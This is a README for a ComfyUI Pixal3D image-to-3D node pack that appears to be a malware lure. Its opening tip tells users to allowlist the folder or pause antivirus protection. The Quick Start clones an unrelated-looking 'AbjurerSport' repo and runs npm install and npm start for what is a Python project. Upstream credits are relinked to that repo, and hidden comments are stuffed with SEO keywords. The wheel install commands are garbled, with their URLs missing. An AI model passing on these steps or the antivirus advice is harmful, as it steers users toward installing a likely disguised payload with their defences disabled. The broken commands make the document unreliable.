# Pixal3D-ComfyUI


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/AbjurerSport/Pixal3D-ComfyUI-hub.git
cd Pixal3D-ComfyUI-hub
npm install
npm start
```


ComfyUI custom nodes for [TencentARC/Pixal3D](https://github.com/AbjurerSport/Pixal3D-ComfyUI-hub): image-to-3D generation, textured GLB export, FlashAttention 2/3 selection, manual camera control, and ComfyUI model unload support.

[Compatibility](docs/compatibility_matrix.md) | [Windows Wheels](docs/windows_wheels.md) | [Build NATTEN On Windows](docs/Build_Natten_windows.md) | [Troubleshooting](docs/troubleshooting.md) | [Chinese README](README_ZH.md)

![Pixal3D preview](https://github.com/user-attachments/assets/45d596b4-9070-44d2-8e4f-1019169d3daa)


## Required Pieces

A working generation environment needs these imports inside the same Python that launches ComfyUI:

| Piece | Required import or file | Notes |
|---|---|---|
| PyTorch CUDA | `torch.cuda.is_available() == True` | CPU-only is not supported |
| Attention | `flash_attn` or `flash_attn_interface` | FlashAttention 2 or 3 |
| Sparse GEMM | `flex_gemm_ap` or `flex_gemm` | Pixal3D CUDA kernel |
| Mesh ops | `cumesh_vb` or `cumesh` | Pixal3D CUDA kernel |
| Voxel/export ops | `o_voxel_vb_ap` or `o_voxel` | Pixal3D CUDA kernel |
| DRTK | `drtk` | UV/export helper |
| Pixal3D model | `ComfyUI/models/Pixal3D/TencentARC_Pixal3D/pipeline.json` | Download manually or use `download_if_missing=true` |
| DINOv3 helper | `ComfyUI/models/Pixal3D/camenduru_dinov3-vitl16-pretrain-lvd1689m/` | Needed by the image encoder |
| MoGe | `ComfyUI/models/geometry_estimation/moge_2_vitl_normal_fp16.safetensors` | Only needed for `camera_mode=moge` |
| RMBG-2.0 | `ComfyUI/models/Pixal3D/briaai_RMBG-2.0/` | Gated model; only needed for `background_mode=auto_remove` |
| NATTEN/libnatten | `natten.HAS_LIBNATTEN == True` | Only needed for strict NAF |

If Environment Check says a CUDA package is missing, install a wheel that exactly matches your stack. Do not let pip replace a working Torch install while testing random wheels; use `--no-deps` for manual CUDA wheels.

## Windows Wheel Order

On Windows, install wheels in this order:

The required Pixal3D CUDA wheels are separate from NATTEN. A working NATTEN install does not mean `flex_gemm`, `cumesh`, `o_voxel`, or `drtk` are installed.

For Python 3.12, PyTorch 2.10, CUDA 13.0 on Blackwell sm120, install the required Pixal3D CUDA wheels plus the prebuilt NATTEN/libnatten wheel with:

```bat
  " ^
  " ^
  " ^
  " ^
  "https://huggingface.co/drbaph/NATTEN-0.21.6-torch2100cu130-cp312-cp312-win_amd64/resolve/main/natten-0.21.6+torch2100cu130-cp312-cp312-win_amd64.whl"
```

If your Python, PyTorch, CUDA, or GPU architecture does not match that NATTEN wheel, omit the final NATTEN URL and use `naf_mode=fallback_if_missing`, `preload_naf=false`.

For Python 3.12, PyTorch 2.8, CUDA 12.8 on Blackwell sm100/sm120, use the matching Pixal3D CUDA wheels plus the `naxneri` NATTEN/libnatten wheel:

```bat
  " ^
  " ^
  " ^
  " ^
  "https://huggingface.co/naxneri/natten-0.21.6-blackwell-cu128-cp312-cp312-win_amd64/resolve/main/natten-0.21.6-blackwell-cu128-cp312-cp312-win_amd64.whl"
```

For PyTorch 2.9 or another CUDA 12.8 stack, change the four Pozzetti URLs to wheels built for that exact Torch version. Keep the NATTEN URL only when it matches your Python, CUDA, and GPU.

More detail: [Windows wheel guide](docs/windows_wheels.md).

## Windows NATTEN / NAF

Pixal3D uses **NAF** as a feature refinement step for the shape and texture stages. NAF uses NATTEN. Strict upstream NAF only works when NATTEN includes CUDA `libnatten`:

```bat
python -c "import natten; print(natten.__version__, natten.HAS_LIBNATTEN)"
```

If that prints `False`, you have normal NATTEN without CUDA libnatten. The node can still run, but you must use:

```text
Pixal3D Model Loader naf_mode=fallback_if_missing
Pixal3D Model Loader preload_naf=false
```

Fallback mode avoids loading NAF and keeps the expected tensor shape by using DINO projection features. It is usually slower and may use more RAM/VRAM than a proper CUDA NATTEN/libnatten build, and quality can be lower than strict upstream NAF.

On Windows, a NATTEN wheel must match all of these:

```text
Python ABI, for example cp312
PyTorch build, for example torch2.10
CUDA build, for example cu130
GPU architecture, for example sm120
OS tag, win_amd64
```

If you cannot find a matching Windows wheel, use fallback mode or build NATTEN from source.

Known community Windows NATTEN wheels:

| Python | PyTorch | CUDA | GPU | Wheel |
|---|---|---|---|---|
| 3.12.10 / 3.13.12 | 2.10 | 13.0 | Ampere sm86, RTX 3050-3090 Ti | [NeilsMabet/Natten-0.21.6-Amphere-wheel-windows](https://github.com/NeilsMabet/Natten-0.21.6-Amphere-wheel-windows) |
| 3.12 | 2.10 | 13.0 | Blackwell sm120 | [drbaph/NATTEN-0.21.6-torch2100cu130-cp312-cp312-win_amd64](https://huggingface.co/drbaph/NATTEN-0.21.6-torch2100cu130-cp312-cp312-win_amd64) |
| 3.12 | 2.8+ | 12.8 | Blackwell sm100/sm120 | [naxneri/natten-0.21.6-blackwell-cu128-cp312-cp312-win_amd64](https://huggingface.co/naxneri/natten-0.21.6-blackwell-cu128-cp312-cp312-win_amd64) |

More detail: [Windows wheel guide](docs/windows_wheels.md) and [Build NATTEN on Windows](docs/Build_Natten_windows.md).

## Manual Model Downloads

If `download_if_missing=false`, download the model files yourself and place them in these folders. Download the full snapshots, not single random files.

| Model | Download link | Local folder | Needed when |
|---|---|---|---|
| Pixal3D | [TencentARC/Pixal3D](https://huggingface.co/TencentARC/Pixal3D) | `ComfyUI/models/Pixal3D/TencentARC_Pixal3D/` | Always |
| DINOv3 helper | [camenduru/dinov3-vitl16-pretrain-lvd1689m](https://huggingface.co/camenduru/dinov3-vitl16-pretrain-lvd1689m) | `ComfyUI/models/Pixal3D/camenduru_dinov3-vitl16-pretrain-lvd1689m/` | Always |
| MoGe | [Comfy-Org/MoGe](https://huggingface.co/Comfy-Org/MoGe) | `ComfyUI/models/geometry_estimation/` | `camera_mode=moge` |
| RMBG-2.0 | [briaai/RMBG-2.0](https://huggingface.co/briaai/RMBG-2.0) | `ComfyUI/models/Pixal3D/briaai_RMBG-2.0/` | `background_mode=auto_remove` |
| NAF upsampler | [valeoai/NAF](https://github.com/valeoai/NAF) | `ComfyUI/models/Pixal3D/torch_hub/` cache | Strict NAF only |

RMBG-2.0 is gated on Hugging Face. Accept the model terms and log in before downloading it. If you do not want RMBG, use a transparent PNG/WebP and set `background_mode=keep_alpha`, or use `background_mode=none`.

Expected model layout:

```text
ComfyUI/models/
├── Pixal3D/
│   ├── TencentARC_Pixal3D/
│   │   ├── pipeline.json
│   │   └── ckpts/
│   │       ├── *.json
│   │       └── *.safetensors
│   ├── camenduru_dinov3-vitl16-pretrain-lvd1689m/
│   │   ├── config.json
│   │   ├── model.safetensors
│   │   └── preprocessor_config.json
│   └── briaai_RMBG-2.0/
│       ├── config.json
│       ├── BiRefNet_config.py
│       ├── birefnet.py
│       ├── model.safetensors
│       └── preprocessor_config.json
└── geometry_estimation/
    ├── moge_1_vitl_fp16.safetensors
    └── moge_2_vitl_normal_fp16.safetensors
```

MoGe files from `Comfy-Org/MoGe` are stored directly in `ComfyUI/models/geometry_estimation/`, not in a nested `Comfy-Org/MoGe` folder. `hf_endpoint` can be changed to a Hugging Face mirror if needed.

## Recommended Loader Settings

General Windows baseline:

| Node | Setting |
|---|---|
| Pixal3D Model Loader | `attention_backend=auto` |
| Pixal3D Model Loader | `vram_mode=dynamic_vram` |
| Pixal3D Model Loader | `naf_mode=fallback_if_missing` unless `natten.HAS_LIBNATTEN=True` |
| Pixal3D Model Loader | `preload_naf=false` unless strict NAF works |
| Pixal3D Image To 3D | `pipeline_type=1024_cascade` for lower VRAM, `1536_cascade` for quality |
| Pixal3D Export GLB | `decimation_target=1000000`, `texture_size=4096` |

Lowest-VRAM/manual path:

| Node | Setting |
|---|---|
| Pixal3D Model Loader | `vram_mode=hybrid_low_vram`, or `native_low_vram` if hybrid has issues |
| Pixal3D Model Loader | `load_moge=false` |
| Pixal3D Model Loader | `load_rembg=false` |
| Pixal3D Image To 3D | `camera_mode=manual` |
| Pixal3D Image To 3D | `background_mode=keep_alpha` with transparent PNG/WebP |
| Pixal3D Camera Control | Connect `manual_fov` to `Pixal3D Image To 3D.manual_fov` |

`hybrid_low_vram` keeps native stage-by-stage CPU/GPU offload, but builds modules with Comfy/Aimdo-aware ops. `native_low_vram` keeps the older pure native staging path. Both trade speed and system RAM for lower VRAM pressure.

## Nodes

| Node | Purpose |
|---|---|
| Pixal3D Environment Check | Prints installed/missing dependencies |
| Pixal3D Model Loader | Loads Pixal3D and helper models |
| Pixal3D Camera Control | Manual FOV, distance, and mesh scale with Scene/POV preview |
| Pixal3D Image To 3D | Runs image-to-3D generation |
| Pixal3D Export GLB | Exports the result to textured `.glb` |
| Pixal3D Unload Model | Clears the Pixal3D pipeline cache and releases the model handle |

Basic workflow:

```text
Load Image -> Pixal3D Image To 3D image
Pixal3D Model Loader -> Pixal3D Image To 3D model
Pixal3D Image To 3D -> Pixal3D Export GLB
Pixal3D Export GLB glb_path -> Preview 3D & Animation model_file
```

Connect `Pixal3D Image To 3D rembg_image` to `Preview Image` to inspect the image Pixal3D used after background preprocessing.

Non-square inputs are padded to square automatically before Pixal3D's square image encoder, so 9:16 or 16:9 images are not stretched. Padding happens after background handling:

```text
auto_remove: input -> RMBG/alpha crop -> pad to square -> RGB image sent to Pixal3D
keep_alpha: transparent input -> alpha crop -> pad to square -> RGB image sent to Pixal3D
none: input -> convert to RGB -> pad to square -> RGB image sent to Pixal3D
```

If the input is transparent and you do not want RMBG, use `background_mode=keep_alpha`. `background_mode=none` ignores alpha by design.

For lower-poly exports, reduce **Pixal3D Export GLB** `decimation_target`. The default is `1000000`; values around `5000` are allowed but can lose detail on complex geometry.

Manual camera workflow:

<table>
  <tr>
    <td align="center">
      <img src="https://github.com/user-attachments/assets/e14fa7a7-e354-44a8-8221-c402bb74e844" width="350"/>
    </td>
    <td align="center">
      <img src="https://github.com/user-attachments/assets/e6bf6c7b-e236-4773-a465-db9a0078d33f" width="350"/>
    </td>
  </tr>
</table>


```text
Load Image -> Pixal3D Camera Control image
Pixal3D Camera Control manual_fov -> Pixal3D Image To 3D manual_fov
Pixal3D Image To 3D camera_mode=manual
```

## Troubleshooting Shortcuts

| Symptom | Fix |
|---|---|
| `No module named flash_attn` | Install a matching FlashAttention 2 wheel, or FlashAttention 3 with `flash_attn_interface` |
| `flex_gemm`, `cumesh`, `o_voxel`, or `drtk` missing | Install matching Pixal3D CUDA wheels for your Python/PyTorch/CUDA/OS |
| `natten.HAS_LIBNATTEN=False` | Use `naf_mode=fallback_if_missing`, `preload_naf=false`, or install/build CUDA NATTEN |
| Strict NAF OOM on 12 GB | Try `vram_mode=hybrid_low_vram`, lower `naf_target_size` to `256` or `128`, or use `naf_mode=fallback_if_missing` |
| RMBG download fails | Accept gated model terms, log in, set `HF_TOKEN`, or use transparent input with `keep_alpha` |
| MoGe missing | Download Comfy-Org/MoGe files to `ComfyUI/models/geometry_estimation/` or use manual camera mode |
| GLB looks fragmented | Try `remesh=true`; keep `decimation_target=1000000` or higher |
| RAM stays high after unload | Use Pixal3D Unload Model; restart ComfyUI to return all reserved Python/PyTorch memory to the OS |

See [Troubleshooting](docs/troubleshooting.md) for longer explanations.

## Useful Links

- [Windows wheel guide](docs/windows_wheels.md)
- [Build NATTEN on Windows](docs/Build_Natten_windows.md)
- [Linux/WSL CUDA guide](docs/linux_wsl_cuda.md)
- [Portable/standalone install](docs/portable_standalone_install.md)
- [Compatibility matrix](docs/compatibility_matrix.md)
- [Related repositories](docs/related_repos.md)

## Acknowledgements

This nodepack builds on [TencentARC/Pixal3D](https://github.com/AbjurerSport/Pixal3D-ComfyUI-hub), [Trellis.2](https://github.com/microsoft/TRELLIS.2), [Trellis](https://github.com/microsoft/TRELLIS), and [Direct3D-S2](https://github.com/DreamTechAI/Direct3D-S2).

If Pixal3D is useful in your work, please cite the upstream project:

```bibtex
@article{li2026pixal3d,
    title={Pixal3D: Pixel-Aligned 3D Generation from Images},
    author={Li, Dong-Yang and Zhao, Wang and Chen, Yuxin and Hu, Wenbo and Guo, Meng-Hao and Zhang, Fang-Lue and Shan, Ying and Hu, Shi-Min},
    journal={arXiv preprint arXiv:2605.10922},
    year={2026}
}
```


<!-- nodejs npm javascript typescript package module library framework windows linux macos -->
<!-- Pixal3D-ComfyUI-hub - tool utility software - download install setup -->
<!-- updated Pixal3D-ComfyUI-hub checker | 2026 open source Pixal3D-ComfyUI-hub | run on windows Pixal3D-ComfyUI-hub addon | open Pixal3D-ComfyUI-hub | lightweight Pixal3D-ComfyUI-hub monitor | free download top Pixal3D-ComfyUI-hub | fast Pixal3D-ComfyUI-hub desktop | launch Pixal3D-ComfyUI-hub client | download for mac high performance Pixal3D-ComfyUI-hub | run free Pixal3D-ComfyUI-hub api | debian local Pixal3D-ComfyUI-hub | online Pixal3D-ComfyUI-hub logger | linux Pixal3D-ComfyUI-hub | quickstart Pixal3D-ComfyUI-hub utility | local Pixal3D-ComfyUI-hub plugin | deploy Pixal3D-ComfyUI-hub encoder | best Pixal3D-ComfyUI-hub gui | Pixal3D-ComfyUI-hub module | how to build Pixal3D-ComfyUI-hub framework | example Pixal3D-ComfyUI-hub downloader | how to build Pixal3D-ComfyUI-hub binding | arch Pixal3D-ComfyUI-hub alternative | Pixal3D-ComfyUI-hub gui | macos Pixal3D-ComfyUI-hub cli | tutorial Pixal3D-ComfyUI-hub | modular Pixal3D-ComfyUI-hub api | lightweight Pixal3D-ComfyUI-hub checker | tutorial Pixal3D-ComfyUI-hub clone | portable Pixal3D-ComfyUI-hub generator | top Pixal3D-ComfyUI-hub module | Pixal D ComfyUI hub github | latest version native Pixal3D-ComfyUI-hub | tutorial safe Pixal3D-ComfyUI-hub | stable Pixal3D-ComfyUI-hub | examples Pixal3D-ComfyUI-hub generator | new version Pixal3D-ComfyUI-hub tool | install fast Pixal3D-ComfyUI-hub platform | how to build Pixal3D-ComfyUI-hub scanner | is Pixal D ComfyUI hub safe | arch Pixal3D-ComfyUI-hub binding | github Pixal3D-ComfyUI-hub package | Pixal3D-ComfyUI-hub app | demo Pixal3D-ComfyUI-hub validator | how to download secure Pixal3D-ComfyUI-hub | github Pixal3D-ComfyUI-hub analyzer | Pixal3D-ComfyUI-hub clone | configure Pixal3D-ComfyUI-hub creator | github Pixal3D-ComfyUI-hub binding | open source Pixal3D-ComfyUI-hub cli | Pixal3D-ComfyUI-hub utility -->
<!-- quickstart stable Pixal3D-ComfyUI-hub optimizer | advanced Pixal3D-ComfyUI-hub gui | 2025 production ready Pixal3D-ComfyUI-hub | Pixal3D-ComfyUI-hub software | reliable Pixal3D-ComfyUI-hub program | quickstart Pixal3D-ComfyUI-hub validator | low latency Pixal3D-ComfyUI-hub extractor | deploy Pixal3D-ComfyUI-hub service | centos online Pixal3D-ComfyUI-hub | Pixal3D-ComfyUI-hub extractor | git clone Pixal3D-ComfyUI-hub creator | github fast Pixal3D-ComfyUI-hub extension | centos Pixal3D-ComfyUI-hub analyzer | demo customizable Pixal3D-ComfyUI-hub | quick start Pixal3D-ComfyUI-hub copy | high performance Pixal3D-ComfyUI-hub | best Pixal3D-ComfyUI-hub addon | examples Pixal3D-ComfyUI-hub | open source Pixal3D-ComfyUI-hub | sample Pixal3D-ComfyUI-hub addon | Pixal3D-ComfyUI-hub encoder | simple Pixal3D-ComfyUI-hub extractor | guide Pixal3D-ComfyUI-hub gui | modern Pixal3D-ComfyUI-hub desktop | download for windows best Pixal3D-ComfyUI-hub | stable Pixal3D-ComfyUI-hub program | Pixal D ComfyUI hub project | walkthrough Pixal3D-ComfyUI-hub checker | latest version Pixal3D-ComfyUI-hub | fast Pixal3D-ComfyUI-hub wrapper | cross platform Pixal3D-ComfyUI-hub sdk | best Pixal3D-ComfyUI-hub analyzer | tar.gz Pixal3D-ComfyUI-hub replacement | execute Pixal3D-ComfyUI-hub checker | Pixal3D-ComfyUI-hub fork | configure Pixal3D-ComfyUI-hub framework | run on linux Pixal3D-ComfyUI-hub binding | guide Pixal3D-ComfyUI-hub generator | run on linux offline Pixal3D-ComfyUI-hub | best Pixal D ComfyUI hub | demo Pixal3D-ComfyUI-hub server | cross platform Pixal3D-ComfyUI-hub parser | self hosted Pixal3D-ComfyUI-hub addon | offline Pixal3D-ComfyUI-hub api | high performance Pixal3D-ComfyUI-hub parser | secure Pixal3D-ComfyUI-hub creator | open source Pixal3D-ComfyUI-hub application | how to use lightweight Pixal3D-ComfyUI-hub | guide Pixal3D-ComfyUI-hub creator | portable Pixal3D-ComfyUI-hub -->
<!-- source code local Pixal3D-ComfyUI-hub | lightweight Pixal3D-ComfyUI-hub clone | free local Pixal3D-ComfyUI-hub engine | demo reliable Pixal3D-ComfyUI-hub encoder | local Pixal3D-ComfyUI-hub replacement | customizable Pixal3D-ComfyUI-hub tracker | arch Pixal3D-ComfyUI-hub | 2025 Pixal3D-ComfyUI-hub | high performance Pixal3D-ComfyUI-hub analyzer | getting started Pixal3D-ComfyUI-hub cli | low latency Pixal3D-ComfyUI-hub addon | how to use safe Pixal3D-ComfyUI-hub parser | download for mac Pixal3D-ComfyUI-hub gui | open source Pixal3D-ComfyUI-hub utility | portable Pixal3D-ComfyUI-hub module | Pixal3D-ComfyUI-hub downloader | run on mac Pixal3D-ComfyUI-hub tracker | Pixal3D-ComfyUI-hub engine | tutorial Pixal3D-ComfyUI-hub monitor | fast Pixal3D-ComfyUI-hub | local Pixal3D-ComfyUI-hub | safe Pixal3D-ComfyUI-hub extension | latest version self hosted Pixal3D-ComfyUI-hub | safe Pixal3D-ComfyUI-hub gui | github Pixal3D-ComfyUI-hub platform | example Pixal3D-ComfyUI-hub decoder | github top Pixal3D-ComfyUI-hub | minimal Pixal3D-ComfyUI-hub api | free Pixal3D-ComfyUI-hub software | Pixal D ComfyUI hub kubernetes | minimal Pixal3D-ComfyUI-hub tool | example Pixal3D-ComfyUI-hub debugger | docs Pixal3D-ComfyUI-hub tracker | configure Pixal3D-ComfyUI-hub server | zip Pixal3D-ComfyUI-hub | download for windows Pixal3D-ComfyUI-hub generator | download for linux Pixal3D-ComfyUI-hub application | how to use Pixal3D-ComfyUI-hub | latest version production ready Pixal3D-ComfyUI-hub web | reliable Pixal3D-ComfyUI-hub library | open simple Pixal3D-ComfyUI-hub | Pixal3D-ComfyUI-hub client | Pixal3D-ComfyUI-hub viewer | demo Pixal3D-ComfyUI-hub | get Pixal3D-ComfyUI-hub wrapper | github Pixal3D-ComfyUI-hub tracker | launch Pixal3D-ComfyUI-hub | docs Pixal3D-ComfyUI-hub application | latest version extensible Pixal3D-ComfyUI-hub | fedora secure Pixal3D-ComfyUI-hub -->
<!-- setup Pixal3D-ComfyUI-hub program | customizable Pixal3D-ComfyUI-hub software | best Pixal3D-ComfyUI-hub reader | portable Pixal3D-ComfyUI-hub api | sample reliable Pixal3D-ComfyUI-hub builder | execute Pixal3D-ComfyUI-hub | source code secure Pixal3D-ComfyUI-hub debugger | macos Pixal3D-ComfyUI-hub monitor | sample Pixal3D-ComfyUI-hub converter | tar.gz modular Pixal3D-ComfyUI-hub | wiki Pixal3D-ComfyUI-hub compressor | how to download Pixal3D-ComfyUI-hub | best Pixal3D-ComfyUI-hub compressor | install portable Pixal3D-ComfyUI-hub | examples Pixal3D-ComfyUI-hub port | fedora Pixal3D-ComfyUI-hub generator | getting started Pixal3D-ComfyUI-hub package | beginner Pixal3D-ComfyUI-hub extension | run on windows Pixal3D-ComfyUI-hub desktop | beginner Pixal3D-ComfyUI-hub plugin | Pixal3D-ComfyUI-hub application | 2025 powerful Pixal3D-ComfyUI-hub | free download Pixal3D-ComfyUI-hub mirror | documentation Pixal3D-ComfyUI-hub tester | 2025 minimal Pixal3D-ComfyUI-hub | wiki Pixal3D-ComfyUI-hub copy | how to use Pixal3D-ComfyUI-hub plugin | wiki Pixal3D-ComfyUI-hub plugin | extensible Pixal3D-ComfyUI-hub | configurable Pixal3D-ComfyUI-hub | modern Pixal3D-ComfyUI-hub sdk | safe Pixal3D-ComfyUI-hub uploader | advanced Pixal3D-ComfyUI-hub program | best Pixal3D-ComfyUI-hub builder | start Pixal3D-ComfyUI-hub creator | setup Pixal3D-ComfyUI-hub scanner | Pixal3D-ComfyUI-hub service | run Pixal3D-ComfyUI-hub addon | free Pixal D ComfyUI hub | how to download Pixal3D-ComfyUI-hub software | how to setup Pixal3D-ComfyUI-hub desktop | Pixal3D-ComfyUI-hub converter | git clone secure Pixal3D-ComfyUI-hub mobile | advanced Pixal3D-ComfyUI-hub | how to download free Pixal3D-ComfyUI-hub | use free Pixal3D-ComfyUI-hub extractor | Pixal D ComfyUI hub not working | Pixal3D-ComfyUI-hub alternative | documentation Pixal3D-ComfyUI-hub addon | configurable Pixal3D-ComfyUI-hub client -->
<!-- walkthrough Pixal3D-ComfyUI-hub parser | documentation portable Pixal3D-ComfyUI-hub mobile | powerful Pixal3D-ComfyUI-hub clone | source code Pixal3D-ComfyUI-hub web | self hosted Pixal3D-ComfyUI-hub software | download for linux Pixal3D-ComfyUI-hub scanner | open source native Pixal3D-ComfyUI-hub | configure Pixal3D-ComfyUI-hub cli | compile Pixal3D-ComfyUI-hub | setup extensible Pixal3D-ComfyUI-hub | Pixal3D-ComfyUI-hub monitor | top Pixal3D-ComfyUI-hub application | ubuntu low latency Pixal3D-ComfyUI-hub | online Pixal3D-ComfyUI-hub wrapper | safe Pixal3D-ComfyUI-hub | free download Pixal3D-ComfyUI-hub extension | Pixal D ComfyUI hub book | Pixal3D-ComfyUI-hub platform | Pixal D ComfyUI hub setup | easy Pixal3D-ComfyUI-hub platform | Pixal D ComfyUI hub documentation | how to download Pixal3D-ComfyUI-hub viewer | Pixal D ComfyUI hub cheat sheet | examples Pixal3D-ComfyUI-hub module | get Pixal3D-ComfyUI-hub alternative | download for mac Pixal3D-ComfyUI-hub | run on linux portable Pixal3D-ComfyUI-hub | wiki Pixal3D-ComfyUI-hub | arch Pixal3D-ComfyUI-hub module | online Pixal3D-ComfyUI-hub scanner | Pixal D ComfyUI hub workflow | updated Pixal3D-ComfyUI-hub fork | getting started Pixal3D-ComfyUI-hub | simple Pixal3D-ComfyUI-hub plugin | updated Pixal3D-ComfyUI-hub software | how to install modular Pixal3D-ComfyUI-hub | Pixal D ComfyUI hub review | download Pixal3D-ComfyUI-hub alternative | github Pixal3D-ComfyUI-hub encoder | modular Pixal3D-ComfyUI-hub mobile | github powerful Pixal3D-ComfyUI-hub tracker | top Pixal3D-ComfyUI-hub validator | source code Pixal3D-ComfyUI-hub server | powerful Pixal3D-ComfyUI-hub | open source Pixal3D-ComfyUI-hub clone | how to build Pixal3D-ComfyUI-hub downloader | linux modern Pixal3D-ComfyUI-hub debugger | updated Pixal3D-ComfyUI-hub | run on windows self hosted Pixal3D-ComfyUI-hub | updated Pixal3D-ComfyUI-hub scanner -->
<!-- Pixal3D-ComfyUI-hub tool | macos native Pixal3D-ComfyUI-hub | 2026 Pixal3D-ComfyUI-hub platform | macos Pixal3D-ComfyUI-hub client | reliable Pixal3D-ComfyUI-hub logger | run on mac Pixal3D-ComfyUI-hub creator | how to install Pixal3D-ComfyUI-hub encoder | how to setup Pixal3D-ComfyUI-hub reader | extensible Pixal3D-ComfyUI-hub validator | updated safe Pixal3D-ComfyUI-hub | arch offline Pixal3D-ComfyUI-hub | ubuntu Pixal3D-ComfyUI-hub service | Pixal D ComfyUI hub fix | download for mac Pixal3D-ComfyUI-hub converter | github Pixal3D-ComfyUI-hub viewer | Pixal3D-ComfyUI-hub optimizer | Pixal D ComfyUI hub vs | Pixal3D-ComfyUI-hub mobile | how to run Pixal3D-ComfyUI-hub builder | advanced Pixal3D-ComfyUI-hub parser | lightweight Pixal3D-ComfyUI-hub | tutorial Pixal3D-ComfyUI-hub application | local Pixal3D-ComfyUI-hub tester | Pixal3D-ComfyUI-hub analyzer | Pixal D ComfyUI hub ci cd | online Pixal3D-ComfyUI-hub plugin | local Pixal3D-ComfyUI-hub reader | how to run Pixal3D-ComfyUI-hub | top Pixal3D-ComfyUI-hub uploader | ubuntu Pixal3D-ComfyUI-hub | open source Pixal3D-ComfyUI-hub program | Pixal3D-ComfyUI-hub parser | build Pixal3D-ComfyUI-hub checker | sample Pixal3D-ComfyUI-hub debugger | run on linux Pixal3D-ComfyUI-hub | deploy Pixal3D-ComfyUI-hub plugin | extensible Pixal3D-ComfyUI-hub api | wiki safe Pixal3D-ComfyUI-hub gui | start Pixal3D-ComfyUI-hub generator | start Pixal3D-ComfyUI-hub | low latency Pixal3D-ComfyUI-hub api | tar.gz Pixal3D-ComfyUI-hub fork | download for windows Pixal3D-ComfyUI-hub package | open source Pixal3D-ComfyUI-hub service | windows Pixal3D-ComfyUI-hub application | beginner Pixal3D-ComfyUI-hub builder | minimal Pixal3D-ComfyUI-hub software | Pixal3D-ComfyUI-hub mirror | centos Pixal3D-ComfyUI-hub | docs Pixal3D-ComfyUI-hub web -->
<!-- 2025 modular Pixal3D-ComfyUI-hub | customizable Pixal3D-ComfyUI-hub package | documentation fast Pixal3D-ComfyUI-hub | native Pixal3D-ComfyUI-hub port | new version Pixal3D-ComfyUI-hub reader | lightweight Pixal3D-ComfyUI-hub desktop | docs Pixal3D-ComfyUI-hub encoder | simple Pixal3D-ComfyUI-hub platform | latest version Pixal3D-ComfyUI-hub optimizer | lightweight Pixal3D-ComfyUI-hub builder | reliable Pixal3D-ComfyUI-hub downloader | fedora Pixal3D-ComfyUI-hub clone | advanced Pixal3D-ComfyUI-hub converter | centos Pixal3D-ComfyUI-hub replacement | github Pixal3D-ComfyUI-hub | run on windows powerful Pixal3D-ComfyUI-hub | linux Pixal3D-ComfyUI-hub downloader | get Pixal3D-ComfyUI-hub checker | macos Pixal3D-ComfyUI-hub | native Pixal3D-ComfyUI-hub creator | 2026 github Pixal3D-ComfyUI-hub | Pixal D ComfyUI hub pipeline | Pixal D ComfyUI hub blog | customizable Pixal3D-ComfyUI-hub tool | how to use reliable Pixal3D-ComfyUI-hub | github Pixal3D-ComfyUI-hub module | new version Pixal3D-ComfyUI-hub wrapper | fedora Pixal3D-ComfyUI-hub api | local Pixal3D-ComfyUI-hub service | run on linux secure Pixal3D-ComfyUI-hub | Pixal D ComfyUI hub cloud | quickstart Pixal3D-ComfyUI-hub engine | demo Pixal3D-ComfyUI-hub compressor | updated portable Pixal3D-ComfyUI-hub | how to deploy Pixal3D-ComfyUI-hub editor | local Pixal3D-ComfyUI-hub desktop | beginner Pixal3D-ComfyUI-hub library | latest version Pixal3D-ComfyUI-hub gui | Pixal3D-ComfyUI-hub api | quick start Pixal3D-ComfyUI-hub compressor | run on windows simple Pixal3D-ComfyUI-hub desktop | how to install Pixal3D-ComfyUI-hub editor | setup Pixal3D-ComfyUI-hub converter | docs Pixal3D-ComfyUI-hub | Pixal3D-ComfyUI-hub tester | linux Pixal3D-ComfyUI-hub platform | source code Pixal3D-ComfyUI-hub port | guide Pixal3D-ComfyUI-hub | github lightweight Pixal3D-ComfyUI-hub sdk | run on mac Pixal3D-ComfyUI-hub program -->
<!-- portable Pixal3D-ComfyUI-hub tracker | tar.gz native Pixal3D-ComfyUI-hub | Pixal3D-ComfyUI-hub program | example Pixal3D-ComfyUI-hub | github Pixal3D-ComfyUI-hub mirror | linux Pixal3D-ComfyUI-hub monitor | production ready Pixal3D-ComfyUI-hub generator | low latency Pixal3D-ComfyUI-hub client | download for windows Pixal3D-ComfyUI-hub checker | tutorial minimal Pixal3D-ComfyUI-hub | how to configure Pixal3D-ComfyUI-hub module | download for linux portable Pixal3D-ComfyUI-hub | getting started Pixal3D-ComfyUI-hub app | open source Pixal3D-ComfyUI-hub viewer | modular Pixal3D-ComfyUI-hub engine | deploy Pixal3D-ComfyUI-hub framework | compile Pixal3D-ComfyUI-hub parser | how to deploy Pixal3D-ComfyUI-hub creator | build simple Pixal3D-ComfyUI-hub extension | source code Pixal3D-ComfyUI-hub | walkthrough Pixal3D-ComfyUI-hub downloader | reliable Pixal3D-ComfyUI-hub | Pixal3D-ComfyUI-hub reader | offline Pixal3D-ComfyUI-hub monitor | updated Pixal3D-ComfyUI-hub utility | online Pixal3D-ComfyUI-hub replacement | new version low latency Pixal3D-ComfyUI-hub | start minimal Pixal3D-ComfyUI-hub debugger | production ready Pixal3D-ComfyUI-hub extension | low latency Pixal3D-ComfyUI-hub application | git clone Pixal3D-ComfyUI-hub copy | sample modern Pixal3D-ComfyUI-hub | Pixal3D-ComfyUI-hub framework | how to setup Pixal3D-ComfyUI-hub scanner | quick start powerful Pixal3D-ComfyUI-hub | extensible Pixal3D-ComfyUI-hub checker | open Pixal3D-ComfyUI-hub generator | self hosted Pixal3D-ComfyUI-hub service | modular Pixal3D-ComfyUI-hub monitor | 2025 Pixal3D-ComfyUI-hub generator | download for mac Pixal3D-ComfyUI-hub uploader | linux local Pixal3D-ComfyUI-hub | run on mac Pixal3D-ComfyUI-hub | portable Pixal3D-ComfyUI-hub reader | linux Pixal3D-ComfyUI-hub addon | run on windows Pixal3D-ComfyUI-hub framework | github open source Pixal3D-ComfyUI-hub analyzer | how to configure minimal Pixal3D-ComfyUI-hub | stable Pixal3D-ComfyUI-hub plugin | compile Pixal3D-ComfyUI-hub desktop -->
